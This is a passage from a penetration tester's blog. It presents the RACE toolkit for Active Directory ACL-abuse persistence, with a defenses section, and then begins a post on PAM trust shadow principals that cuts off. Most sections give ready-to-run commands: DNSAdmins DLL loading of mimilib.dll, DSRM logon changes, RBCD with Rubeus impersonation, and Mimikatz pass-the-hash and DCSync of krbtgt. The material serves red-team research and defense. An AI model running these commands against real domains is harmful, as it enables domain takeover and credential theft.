<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieGmTfBFZbIDa0UxNvws3qOsUUW8KqBxqLv6z04fAAiWgKnJvMiMP4oUj1RnFqwoRUWpbzvXpImZqmm0VyFNhyiVYa2cY5wEZBVKVicZsUtR3ImFyUhCOo9midSqYFZKa457jCTanMBio/s1600/DAMP-labuser-RACE.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="222" data-original-width="889" height="98" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieGmTfBFZbIDa0UxNvws3qOsUUW8KqBxqLv6z04fAAiWgKnJvMiMP4oUj1RnFqwoRUWpbzvXpImZqmm0VyFNhyiVYa2cY5wEZBVKVicZsUtR3ImFyUhCOo9midSqYFZKa457jCTanMBio/s400/DAMP-labuser-RACE.png" width="400" /></a></div>
Sweet!<br />
Below is a video of the attack:<br />
<iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/nHhebfX78B0" width="560"></iframe><br />
<br />
Note that there is no log for change in permission of the registry keys. But as for the other attacks, there will be 4624 and 4634 log entries when accessing the DC.<br />
<br />
<h4>
On demand Privilege Escalation on DC - DNSAdmins</h4>
DNSAdmins is an AD security group which has the capability to load arbitrary DLLs from a UNC path in the DNS service. See <a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">this post</a> and <a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">my post</a>. This group is effectively DA equivalent if DNS service is running on a DC.<br />
<br />
The group has Read, Write, Create All Child objects, Delete Child objects, Special Permissions on the DNS Server object. We can either:<br />
- Modify ACL of the DNS Server object to have the same rights as the DNSAdmins group to abuse the DLL configuration feature.<br />
<br />
or<br />
<br />
- Modify the ACL of the DNSAdmins group because it is not a Protected Group (ACL not protected by AdminSDHolder)<br />
<br />
Let's modify the ACL of the DNS Server object to be able to load DLL remotely and also provide service start and stop rights on the DNS service for a user we control. Use the below command:<br />
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">Set-DNSAbusePermissions -SAMAccountName labuser -DistinguishedName 'CN=MicrosoftDNS,CN=System,DC=offensiveps,DC=powershell,DC=local' -ComputerName ops-dc -Verbose 
</textarea></pre>
Now, use the below command as labuser to load mimilib.dll from Mimikatz to load the DLL in DNS Service. Please note that the DNSServer module from DNS RSAT is required for the below command:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Invoke-DNSAbuse -ComputerName ops-dc -DLLPath \\ops-build\dll\mimilib.dll -Verbose 
</textarea></pre>
</div>
<br />
<h4>
On demand Privilege Escalation on DC - DSRM Administrator </h4>
<div style="text-align: justify;">
DSRM administrator is a special 'local administrator' account on a DC. This is <a href="https://adsecurity.org/?p=1785">very useful for persistence</a> as it is seldom changed. By default, this user cannot logon from network. But this logon behavior can be changed by modifying the registry key - HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior and set its value to 2.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
This means, once we have DA privileges, we can:</div>
<div style="text-align: justify;">
- Extract the hash for DSRM administrator (Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"') or we can&nbsp; also chain this with modification of registry keys, as  discussed previously, to obtain the DSRM hash without admin privileges. </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
- Modify the permissions of the above registry key so that a user we control can change it on demand.</div>
<div style="text-align: justify;">
- Use Mimikatz PTH to connect to the DC.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Lets try it. Run the below command to modify the DSRMLogonBehavior registry key and allow labuser to modify it anytime. If the key doesn't exist, it is created:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-DCPermissions -Method DSRMAdmin -SAMAccountName labuser -Server ops-dc -Verbose 
</textarea></pre>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOec03j_OhywX0eXBaXewBO_dDOKXYUWF37PWjg-rswlm6QwDK5fne_Q9Q6_x022xdFeTHfd5itEKyWFiSu977gGbylb7OMb-rO976QWcPBfN1Ng-Q31uyT8o9s7PWz-SdKpdl8LnHiQ0/s1600/DSRM-DA.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="145" data-original-width="1563" height="36" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOec03j_OhywX0eXBaXewBO_dDOKXYUWF37PWjg-rswlm6QwDK5fne_Q9Q6_x022xdFeTHfd5itEKyWFiSu977gGbylb7OMb-rO976QWcPBfN1Ng-Q31uyT8o9s7PWz-SdKpdl8LnHiQ0/s400/DSRM-DA.png" width="400" /></a></div>
As labuser, we can modify the registry key. Note that this needs to be coupled with modification of ACL of a remote access method (PSRemoting, WMI, Remote Registry or DCOM). Let's use PSRemoting for that:</div>
<div style="text-align: justify;">
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
</textarea></pre>
</div>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdTG-j4sCC3vNrRoC7LKOGkuaLpgdctHOIuwmAaeFOKpYajg0VKeLwtzXRTSxio7uUpJpDm_barP677jvOtJwo4zdrM0cWDnDhwor_tIS_lbK6BdWF-SyQlRPTcw9lVxivKLN5Nuot6Mo/s1600/DSRM-User.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="86" data-original-width="1600" height="21" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdTG-j4sCC3vNrRoC7LKOGkuaLpgdctHOIuwmAaeFOKpYajg0VKeLwtzXRTSxio7uUpJpDm_barP677jvOtJwo4zdrM0cWDnDhwor_tIS_lbK6BdWF-SyQlRPTcw9lVxivKLN5Nuot6Mo/s400/DSRM-User.png" width="400" /></a></div>
<br />
Now, we can use PTH (note the /domain parameter in the below command) to access the DC. We need to use NTLM authentication to access the DC as we are using a local account:</div>
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">Invoke-Mimikatz -Command '"sekurlsa::pth /domain:ops-dc /user:Administrator /ntlm:<ntlmhash> /run:powershell.exe"'

Enter-PSSession ops-dc -Authentication Negotiate  </textarea></pre>
<h4 style="text-align: left;">
Persistence using DC - Resource-based Constrained Delegation (RBCD)</h4>
<div style="text-align: justify;">
Resource-based Constrained Delegation enables the resource owner to set delegation to it. Unlike the traditional Delegation, DA privileges are not required to set RBCD.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
As per <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#generic-dacl-abuse">this post, for Generic DACL abuse</a> of RBCD, if a user we control has Write permissions on a computer object, that user can configure RBCD on the machine. This allows the ability to access the target machine as any user including DA. </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Use the below command to give labuser permissions to configure RBCD on 'ops-file' by modifying the ACLs of ops-file computer object. This will need DA privileges:</div>
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">Set-DCPermissions -Method RBCD -DistinguishedName 'CN=OPS-FILE,OU=Servers,DC=offensiveps,DC=powershell,DC=local' -SAMAccountName labuser -Verbose 
</textarea></pre>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO6fe28BgMMGBVs8W27UygZ3YTPkjsdYR4Kx5vYgfGuRhAPSXcgUx7Io9GDTex-bO6_zisLRoV4w3vKToQJbYU8sKFzAtqxvRfIZneFu3hGClolepy0Uf6p96eE1YUxYRSxZSOPkCX3nU/s1600/RBCD-DA.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="274" data-original-width="1600" height="67" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhO6fe28BgMMGBVs8W27UygZ3YTPkjsdYR4Kx5vYgfGuRhAPSXcgUx7Io9GDTex-bO6_zisLRoV4w3vKToQJbYU8sKFzAtqxvRfIZneFu3hGClolepy0Uf6p96eE1YUxYRSxZSOPkCX3nU/s400/RBCD-DA.png" width="400" /></a></div>
As labuser, run the below command (needs the ActiveDirectory module) to configure RBCD from attacker machine ops-user1$ to ops-file. This enables us to access ops-file as any user when we impersonate the ops-user1 machine:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-ADComputer -Identity ops-file -PrincipalsAllowedToDelegateToAccount ops-user1$
</textarea></pre>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhR39s3XgB2_BxNrxhhNSDS7RlpU_5BSUn5AJrVLLwbhRmMgHfGA8AzhRo5kZG_XcBHK9r8zW-AvRQo_C6JTlgvSjE2ArxA0clctxin29dBuhaQdOqIVAu-RkN2Z3bxAN2JebST9jzgKBY/s1600/RBCD-labuser.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="125" data-original-width="1600" height="30" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhR39s3XgB2_BxNrxhhNSDS7RlpU_5BSUn5AJrVLLwbhRmMgHfGA8AzhRo5kZG_XcBHK9r8zW-AvRQo_C6JTlgvSjE2ArxA0clctxin29dBuhaQdOqIVAu-RkN2Z3bxAN2JebST9jzgKBY/s400/RBCD-labuser.png" width="400" /></a></div>
We can extract the AES256 keys for the ops-user1$ account by dumping credetials on that machine (Invoke-Mimikatz -Command '"sekurlsa::ekeys"'). </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Now, we can use <a href="https://github.com/GhostPack/Rubeus/">Rubeus</a> to impersonate a DA which effectively means local admin on ops-file.</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">.\Rubeus.exe s4u /user:ops-user1$ /aes256:AES256KeyofUser1$ /msdsspn:cifs/ops-file /impersonateuser:administrator /ptt 
</textarea></pre>
<div style="text-align: justify;">
Please note that we are merely impersonating the DA for accessing ops-file. We cannot access any other machine from ops-file as DA. </div>
<br />
<h4 style="text-align: justify;">
Persistence using DC - Exchange Groups</h4>
<div style="text-align: justify;">
Exchange creates multiple groups on installation. Groups like Exchange Servers, Exchange Trusted Subsystem and Exchange Windows Permissions have interesting permissions. The groups are added in a new container 'Microsoft Exchange Security Groups'.&nbsp;</div>
<div style="text-align: justify;">
</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
None of the Exchange Groups is a protected group so we can modify their ACLs for persistence.</div>
<div style="text-align: justify;">
Let's target the Exchange Windows Permissions group which has WriteDACL permission on the domain object (or even forest root domain object depending on the installation).</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
In our example, we target the Exchange Windows Permissions group on the forest root powershell.local.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Using DA privileges (on forest root in this case), run the below command to provide labuser WriteDACL permissions on the Exchange Windows Permissions group:</div>
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">Set-DCPermissions -Method GroupDACL -DistinguishedName 'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=powershell,DC=local' -SAMAccountName ops\labuser -Verbose 
</textarea></pre>
<div style="text-align: justify;">
Now, as labuser, we modify the ACL of the Exchange Windows Permissions group and add WriteMember rights to labuser. Note that this is just one of the paths once we have WriteDACL on the group:<br />
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">Set-ADACL -SamAccountName ops\labuser -DistinguishedName 'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=powershell,DC=local' -GUIDRight WriteMember -Server powershell.local -Verbose
</textarea></pre>
</div>
Next, add labuser (or a proxy user) to the Exchange Windows Permissions group. Because of this group membership, labuser will have WriteDACL rights on the domain object of the forest root:<br />
<pre><textarea cols="70" readonly="readonly" rows="5" style="background-color: #012456; color: white;">$user = Get-ADUser -Identity labuser

$group = Get-ADGroup -Identity 'Exchange Windows Permissions' -Server powershell.local

Add-ADGroupMember -Identity $group -Members $user -Verbose
</textarea></pre>
Usig the WriteDACL rights with labuser, add DCSync rights for labuser:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-ADACL -SamAccountName ops\labuser -DistinguishedName 'DC=powershell,DC=local' -GUIDRight DCSync -Server ps-dc -Verbose
</textarea></pre>
Finally, run the DCSync attack:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Invoke-Mimikatz -Command '"lsadump::dcsync /user:ps\krbtgt /domain:powershell.local"'
</textarea></pre>
<br />
Below is a video of the attack:<br />
<iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/sySINjLZzwk" width="560"></iframe><br />
<br />
<b>Other well known techqniues implemented in the RACE tookit are:</b><br />
<br />
<h4 style="text-align: left;">
AdminSDHolder</h4>
<div style="text-align: justify;">
<a href="https://adsecurity.org/?p=1906">ICYMI</a>, the ACL of the AdminSDHolder is overwritten on all Protected Groups by an automatic process called SDProp every 60 minutes. This means any changes we do to the ACL of AdminSDHolder will be propagated to all the Protected Groups too. Therefore, it is a very interesting persistence technique.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Use the below command as DA to add WriteDACL permissions for labuser on AdminSDHolder:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-DCPermissions -Method AdminSDHolder -SAMAccountName labuser -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=offensiveps,DC=powershell,DC=local' -Verbose 
</textarea></pre>
This allows us to push whatever permissions we want on all the Protected Groups as labuser:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=offensiveps,DC=powershell,DC=local' -Principal labuser -Right GenericAll -Verbose 
</textarea></pre>
<div style="text-align: justify;">
<h4>
DCSync</h4>
The most famous ACL abuse. We can modify the ACL of the domain object to provide DCSync rights to a user we control. Run the below as DA:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-DCPermissions -Method DCSync -SAMAccountName labuser -DistinguishedName 'DC=offensiveps,DC=powershell,DC=local' -Verbose
</textarea></pre>
<div style="text-align: justify;">
<br />
<h4>
DCShadow</h4>
</div>
<div style="text-align: justify;">
DCShadow provides very useful forest persistence. See <a href="https://www.dcshadow.com/">this</a> and <a href="https://www.labofapenetrationtester.com/2018/04/dcshadow.html">this</a>.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
With DA privileges on forest root and from a machine joined to forest root, run the following command to modify ACLs of multiple objects. This will allow to run DCShadow without DA:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-DCShadowPermissions -FakeDC ops-user1 -SAMAccountName serviceuser -Username labuser -Verbose 
</textarea></pre>
<div style="text-align: justify;">
The above command modifies ACLs for:</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
The domain object.</div>
<div style="text-align: justify;">
- DS-Install-Replica (Add/Remove Replica in Domain)</div>
<div style="text-align: justify;">
- DS-Replication-Manage-Topology (Manage Replication Topology)</div>
<div style="text-align: justify;">
- DS-Replication-Synchronize (Replication Synchronization)</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
The Sites object (and its children) in the Configuration container.</div>
<div style="text-align: justify;">
- CreateChild and DeleteChild</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
</div>
<div style="text-align: justify;">
The object of the computer which is registered as a DC - ops-user1 above.</div>
<div style="text-align: justify;">
</div>
<div style="text-align: justify;">
WriteProperty (Not GenericWrite)</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
The target object - serviceuser above </div>
<div style="text-align: justify;">
WriteProperty (Not GenericWrite)</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
We can now run DCShadow against serviceuser from ops-user1 as labuser. </div>
<br />
<h4 style="text-align: left;">
Previous work</h4>
<div style="text-align: left;">
Directly taken from my talk slides:</div>
<div style="text-align: left;">
- ACL abuse is not something new, system administrators have been using this for so many years!</div>
<div style="text-align: left;">
- We can still see articles <a href="http://active-undelete.com/dcom-configuration.htm">from 2001 talking about setting Launch Permissions for DCOM</a>, for <a href="https://redmondmag.com/articles/2002/02/01/securing-remote-management-with-wmi.aspx">WMI from 2002</a> and so on. </div>
<div style="text-align: left;">
- (French) Chemins de contrle en environnement Active Directory<br />
<a href="https://www.sstic.org/2014/presentation/chemins_de_controle_active_directory/">https://www.sstic.org/2014/presentation/chemins_de_controle_active_directory/</a></div>
<div style="text-align: left;">
- An ACE Up the Sleeve Designing Active Directory DACL Backdoors (DEF CON 25) <a href="https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEF%20CON%2025%20-%20Andrew-Robbins-and-Will-Schroeder-An-Ace-Up-The-Sleeve.pdf">https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEF%20CON%2025%20-%20Andrew-Robbins-and-Will-Schroeder-An-Ace-Up-The-Sleeve.pdf</a></div>
<br />
<h4 style="text-align: left;">
Defenses</h4>
<div style="text-align: justify;">
Protecting your privileged users is definitely the best defense.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
<b>Event logs</b> are also useful for detecting these attacks. While there are almost no logs for ACL changes in the default configuration, we can still use the security logs when someone accesses a target machine using Events 4624, 4634 and 4672 in case of admin logon. </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
For ACL change logs, configure Auditing for ACL changes. See <a href="https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/">this technet article</a> for guidance. </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
<b>Regular ACL auditing</b> is also useful in weeding out unnecessary or malicious ACEs. We can use tools like <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>, <a href="https://github.com/canix1/ADACLScanner">ADACLScanner</a> and <a href="https://github.com/vletoux/pingcastle">PingCastle</a> for that. </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
A project I created <b><a href="https://github.com/samratashok/Deploy-Deception">Deploy-Deception</a></b>, can be used in creating accounts which have mis-configured ACLs and have verbose logging enabled. It is useful tricking an attacker in assuming they found object(s) with misconfigured ACLs</div>
<br />
<h4 style="text-align: left;">
Future Work</h4>
Directly taken from my talk slides:<br />
<br />
- Service Permissions are stored in Registry. So, that is a place ripe for abuse.<br />
-&nbsp; As noted earlier, WMI Permanent Event Consumer needs to be explored more.<br />
- For the RACE toolkit, work on hiding the ACE we introduce is highly desirable. Also, implementation of more Registry Autoruns! Currently, Remove option does not work for multiple functions. <br />
<br />
That is all! Hope you like it!</div>
<br />
<br />
Slides of the DEF CON 27 talk:<br />
<iframe allowfullscreen="" frameborder="0" height="485" marginheight="0" marginwidth="0" scrolling="no" src="//www.slideshare.net/slideshow/embed_code/key/LJXFDZ4KebYcnK" style="border-width: 1px; border: 1px solid #ccc; margin-bottom: 5px; max-width: 100%;" width="595"> </iframe> <br />
<div style="margin-bottom: 5px;">
<b> <a href="https://www.slideshare.net/nikhil_mittal/race-minimal-rights-and-ace-for-active-directory-dominance" target="_blank" title="RACE - Minimal Rights and ACE for Active Directory Dominance">RACE - Minimal Rights and ACE for Active Directory Dominance</a> </b> from <b><a href="https://www.slideshare.net/nikhil_mittal" target="_blank">Nikhil Mittal</a></b> </div>
<br />
<br />
<br />
<br /></div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Posted by
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
<span itemprop='name'>Nikhil SamratAshok Mittal</span>
</a>
</span>
</span>
<span class='post-timestamp'>
at
<meta content='http://www.labofapenetrationtester.com/2019/08/race.html' itemprop='url'/>
<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2019/08/race.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2019-08-23T23:07:00+05:30'>11:07&#8239;PM</abbr></a>
</span>
<span class='post-comment-link'>
<a class='comment-link' href='https://www.labofapenetrationtester.com/2019/08/race.html#comment-form' onclick=''>
No comments:
  </a>
</span>
<span class='post-icons'>
<span class='item-control blog-admin pid-1005506833'>
<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=1231579039314607678&from=pencil' title='Edit Post'>
<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
</span>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=1231579039314607678&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=1231579039314607678&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=1231579039314607678&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=1231579039314607678&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=1231579039314607678&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
</div>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
Labels:
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Advanced%20Windows%20Tradecraft' rel='tag'>Advanced Windows Tradecraft</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Mimikatz' rel='tag'>Mimikatz</a>,
<a href='https://www.labofapenetrationtester.com/search/label/RACE' rel='tag'>RACE</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Red%20Team' rel='tag'>Red Team</a>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
</div>

          </div></div>
        

          <div class="date-outer">
        
<h2 class='date-header'><span>Thursday, April 18, 2019</span></h2>

          <div class="date-posts">
        
<div class='post-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj27jSOEr8tKHCVpp1bNkJ4I35mXqAUJJRRlodK4nBisYU1VzFkRSf6M1kipT2Qhjf32-CGPTY4iTKSFRSBCB0fG3OMkza3jyS-BlZy_fi7DWCrExYEkOzs-rWbKAOhg2Jjpn9dbyhDH2I/s640/PAM+%25281%2529.png' itemprop='image_url'/>
<meta content='8135211063584500909' itemprop='blogId'/>
<meta content='8055274958523202112' itemprop='postId'/>
<a name='8055274958523202112'></a>
<h3 class='post-title entry-title' itemprop='name'>
<a href='https://www.labofapenetrationtester.com/2019/04/abusing-PAM.html'>How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks</a>
</h3>
<div class='post-header'>
<div class='post-header-line-1'></div>
</div>
<div class='post-body entry-content' id='post-body-8055274958523202112' itemprop='articleBody'>
<div dir="ltr" style="text-align: left;" trbidi="on">
<div style="text-align: justify;">
I did a super interesting AD security assessment for a client recently. They are re-deploying their infrastructure and upgrading their forest(s) to Server 2016 Functional Level. There are so many interesting things which we did during the assessment but the most interesting for me was their attempt to establish Privileged Access Management (PAM) trust in an "interesting" way. It is a classic example of deploying something which sounds secure without actually understanding what it does.&nbsp;</div>
<div style="text-align: justify;">
<br />
Microsoft <a href="https://docs.microsoft.com/en-us/windows-server/identity/whats-new-active-directory-domain-services#a-namebkmkpamaprivileged-access-management">introduced</a> Privileged Access Management (PAM) with Server 2016. Among other things, it has very interesting features like -<br />
- A bastion forest (Think the administrative forest in <a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#ESAE_BM">ESAE</a> or the famous Red Forest)<br />
- Shadow security principals<br />
- Temporary group membership (Add a user to a group with time-to-live (TTL))<br />
<br />
<h3>
</h3>
<h4>
So what is PAM?&nbsp;</h4>
<br />
PAM has been discussed in much detail <a href="https://www.petri.com/windows-server-2016-set-privileged-access-management">here by Russel</a> and <a href="https://blogs.technet.microsoft.com/389thoughts/2017/06/19/ad-2016-pam-trust-how-it-works-and-safety-advisory/">here by Willem</a>. Please read them for understanding what PAM has to offer. A quick explanation is below:<br />
<br />
In a perfect world, PAM enables managing an existing production/user forest using a bastion forest which has a one-way PAM trust with the existing forest. The users in the bastion forest can be 'mapped' to privileges groups like Domain Admins and Enterprise Admins in the user forest without modifying any group memberships or ACLs. This is done by creating Shadow security principals in the bastion forest, which are mapped to SIDs for high privilege groups in the user forest and then add users from the admin forest as members of the shadow security principals.<br />
<br />
<h4>
Example</h4>
<br />
Let's have a look at an example. We have powershell.local as our user forest and bastion.local as the bastion or admin forest. What we want to do it to be able to manage powershell.local from  bastion.local without modifying any group membership or ACLs on  powershell.local.<br />
<br />
A one way PAM trust can be established between the two forest using the commands below (taken from Petri article linked above) :<br />
On user forest (powershell.local in our example) -<br />
<pre><textarea cols="70" readonly="readonly" rows="13" style="background-color: black; color: white;">netdom trust powershell.local /Domain:bastion.local /Add /UserD:administrator@bastion.local /PasswordD:Password@123 /UserO:administrator@powershell.local /PasswordO:Password@123

netdom trust powershell.local /domain:bastion.local /ForestTransitive:Yes 

netdom trust powershell.local /domain:bastion.local /EnableSIDHistory:Yes 

netdom trust powershell.local /domain:bastion.local /EnablePIMTrust:Yes 

netdom trust powershell.local /domain:bastion.local /Quarantine:No

</textarea></pre>
On bastion forest -<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">netdom trust bastion.local /domain:powershell.local /ForestTransitive:Yes
</textarea></pre>
Shadow Principals reside in a special container 'CN=Shadow Principal Configuration' in the Configuration container on bastion forest. We can create Shadow security principals on bastion.local using the below PowerShell code:<br />
<pre><textarea cols="70" readonly="readonly" rows="10" style="background-color: #012456; color: white;"># Get the SID for the Enterprise Admins group of the existing forest
$ShadowPrincipalSid = (Get-ADGroup -Identity 'Enterprise Admins' -Properties ObjectSID -Server powershell.local).ObjectSID

# Container location
$Container = 'CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local'

# Create the Shadow principal - note the type
New-ADObject -Type msDS-ShadowPrincipal -Name "psforest-ShadowEnterpriseAdmin" -Path $Container -OtherAttributes @{'msDS-ShadowPrincipalSid'= $ShadowPrincipalSid}
</textarea></pre>
In the above command we are mapping the SID of Enterprise Admins group of the user forest powershell.local to a Shadow security principal "psforest-ShadowEnterpriseAdmin". Please note that we can also map the shadow principal to a user in the user forest.<br />
<br />
Shadow Principals reside in a special container 'CN=Shadow Principal Configuration,CN=Services' under the Configuration container on bastion forest. We can create Shadow security principals on bastion.local using the below PowerShell code:<br />
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;"># Add the DA of bastion forest to shadow principals thus providing Enterprise Admins privileges on existing forest
Set-ADObject -Identity "CN=psforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=bastion,DC=local"} -Verbose
</textarea></pre>
Now, it is possible to manage powershell.local forest from bastion.local without making any changes in the group memberships or ACLs on powershell.local.<br />
<br />
This looks great! This takes away administrative overhead of managing groups and ACLs and reduces chances of lateral movement techniques like OverPTH, PTT and other credential relay techniques.<br />
<br />
Now, there is something worth noticing about the above setup. To be able to use the shadow security principals, we had to allow SIDHistory in the PAM trust which means no <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)#sid-filtering">SID Filtering</a>. We will see in the next section how this can be dangerous if not configured properly.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
<h4>
The Misconfiguration</h4>
<h4>
&nbsp;</h4>
</div>
<div style="text-align: justify;">
